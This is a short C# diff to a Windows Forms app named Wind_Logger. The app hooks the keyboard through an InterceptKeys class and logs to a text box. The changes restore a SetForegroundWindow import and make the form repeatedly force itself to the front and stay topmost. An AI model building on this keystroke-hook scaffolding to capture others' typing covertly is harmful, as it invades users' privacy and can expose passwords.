@@ -15,10 +15,10 @@ namespace Wind_Logger
     {
         private WindLogger windlogger = null;
 
-        /*[System.Runtime.InteropServices.DllImport("User32")]
+        [System.Runtime.InteropServices.DllImport("User32")]
         private static extern bool SetForegroundWindow(
             IntPtr hWnd
-        );*/
+        );
 
         public ssl_windlogger()
         {
@@ -38,7 +38,12 @@ namespace Wind_Logger
             InterceptKeys.log = txt_log;
             InterceptKeys.logger = windlogger;
             InterceptKeys._hookID = InterceptKeys.SetHook(InterceptKeys._proc);
-    }
+
+            SetForegroundWindow(Handle);
+
+            TopMost = true;
+            TopLevel = true;
+        }
 
         private void ssl_windlogger_FormClosed(object sender, FormClosedEventArgs e)
         {
@@ -47,17 +52,33 @@ namespace Wind_Logger
 
         private void ssl_windlogger_Activated(object sender, EventArgs e)
         {
+            TopMost = true;
+            TopLevel = true;
 
         }
 
         private void ssl_windlogger_Deactivate(object sender, EventArgs e)
         {
-
+            TopMost = true;
+            TopLevel = true;
         }
 
         private void ssl_windlogger_KeyPress(object sender, KeyPressEventArgs e)
         {
+            TopMost = true;
+            TopLevel = true;
+        }
 
+        private void ssl_windlogger_Enter(object sender, EventArgs e)
+        {
+            TopMost = true;
+            TopLevel = true;
+        }
+
+        private void ssl_windlogger_Leave(object sender, EventArgs e)
+        {
+            TopMost = true;
+            TopLevel = true;
         }
     }
 }
